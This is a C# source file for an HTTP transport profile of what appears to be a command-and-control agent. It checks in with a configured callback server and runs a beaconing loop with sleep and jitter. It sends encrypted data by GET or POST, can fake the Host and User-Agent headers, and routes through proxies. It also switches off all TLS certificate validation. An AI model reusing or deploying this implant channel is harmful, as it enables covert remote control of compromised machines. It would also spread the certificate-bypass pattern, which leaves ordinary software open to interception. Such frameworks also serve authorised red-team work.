using Workflow.Contracts;
using Workflow.Models;
using System.Net;
using Workflow.Utilities;
using System.Net.Security;
using System.Text.Json;

namespace Workflow.Channels
{
    public class HttpProfile : IChannel
    {
        public IServiceConfig agentConfig { get; set; }
        public ISecurityProvider crypt { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private string userAgent { get; set; }
        private string hostHeader { get; set; }
        private string getURL { get; set; }
        private string postURL { get; set; }
        private string proxyHost { get; set; }
        private string proxyPass { get; set; }
        private string proxyUser { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private HttpClient _client { get; set; }

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;

        public HttpProfile(IServiceConfig config, ISecurityProvider crypto, ILogger logger, IDataBroker messageManager)
        {
            HttpClientHandler handler = new HttpClientHandler();
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;

            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                HttpChannelOptionsJsonContext.Default.HttpChannelOptions);

            string callbackHost = opts.CallbackHost;
            int callbackPort = opts.CallbackPort;
            string getUri = opts.GetUri;
            string postUri = opts.PostUri;
            string queryPath = opts.QueryPathName;
            this.userAgent = opts.Headers?.GetValueOrDefault("User-Agent", "") ?? "";
            this.hostHeader = opts.Headers?.GetValueOrDefault("Host", "") ?? "";
            this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
            this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
            this.proxyHost = string.IsNullOrEmpty(opts.ProxyPort)
                ? opts.ProxyHost
                : $"{opts.ProxyHost}:{opts.ProxyPort}";
            this.proxyPass = opts.ProxyPass;
            this.proxyUser = opts.ProxyUser;

            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );

            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this._client = new HttpClient(handler);

            DebugLog.Log("HTTP config loaded");
            DebugLog.Log($"GET URL: {this.getURL}");
            DebugLog.Log($"POST URL: {this.postURL}");
            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                DebugLog.Log($"Proxy configured: {this.proxyHost}");
            }

            if (!string.IsNullOrEmpty(this.hostHeader))
            {
                this._client.DefaultRequestHeaders.Host = this.hostHeader;
            }

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this._client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            if (opts.Headers != null)
            {
                foreach (var header in opts.Headers)
                {
                    if (header.Key != "User-Agent" && header.Key != "Host")
                    {
                        this._client.DefaultRequestHeaders.Add(header.Key, header.Value);
                    }
                }
            }
        }


        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                DebugLog.Log($"HTTP checkin attempt {currentAttempt + 1}/{maxAttempts}");
                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

                if (!string.IsNullOrEmpty(res))
                {
                    DebugLog.Log("HTTP checkin succeeded");
                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
                }
                DebugLog.Log("HTTP checkin attempt failed, empty response");
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            DebugLog.Log("HTTP checkin failed after all attempts");
            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                int sleepMs = Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000;
                DebugLog.Log($"HTTP beacon sleeping {sleepMs}ms");
                await Task.Delay(sleepMs);
                DebugLog.Log("HTTP beacon iteration starting");
                try
                {
                    string responseString = await this.Send(messageManager.GetAgentResponseString());
                    if (String.IsNullOrEmpty(responseString))
                    {
                        this.currentAttempt++;
                        DebugLog.Log($"HTTP beacon empty response, attempt {this.currentAttempt}/{this.maxAttempts}");
                        continue;
                    }

                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    if (gtr == null)
                    {
                        this.currentAttempt++;
                        DebugLog.Log($"HTTP beacon null tasking response, attempt {this.currentAttempt}/{this.maxAttempts}");
                        continue;
                    }

                    this.currentAttempt = 0;
                    DebugLog.Log("HTTP beacon received tasking");

                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);

                    this.SetTaskingReceived(null, tra);
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                    DebugLog.Log($"HTTP beacon exception, attempt {this.currentAttempt}/{this.maxAttempts}");
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    DebugLog.Log("HTTP beacon max attempts reached, cancelling");
                    this.cancellationTokenSource.Cancel();
                }
            }
        }
        internal async Task<string> Send(string json)
        {
            try
            {
                DebugLog.Log($"HTTP Send payload ({json.Length} bytes before encryption)");

                //This will encrypted if AES is selected or just Base64 encode if None is referenced.
                json = this.crypt.Encrypt(json);

                HttpResponseMessage response;

                DebugLog.Log($"HTTP Send via {(json.Length < 2000 ? "GET" : "POST")} ({json.Length} bytes)");
                if (json.Length < 2000) //Max URL length
                {
                    // If there are trailing "==" (Base64 padding) at the end of the string, URL-encode them as "%3D%3D"
                    if (json.EndsWith("=="))
                    {
                        json = json.Substring(0, json.Length - 2) + "%3D%3D";
                    }
                    response = await this._client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'), cancellationTokenSource.Token);
                }
                else
                {
                    response = await this._client.PostAsync(this.postURL, new StringContent(json), cancellationTokenSource.Token);
                }

                string strRes = await response.Content.ReadAsStringAsync();

                //This will decrypt and remove the UUID if AES is referenced, or just remove the UUID if None is referenced.
                DebugLog.Log("HTTP Send succeeded");
                return this.crypt.Decrypt(strRes);
            }
            catch
            {
                DebugLog.Log("HTTP Send failed");
                return String.Empty;
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();

            return true;
        }
    }
}
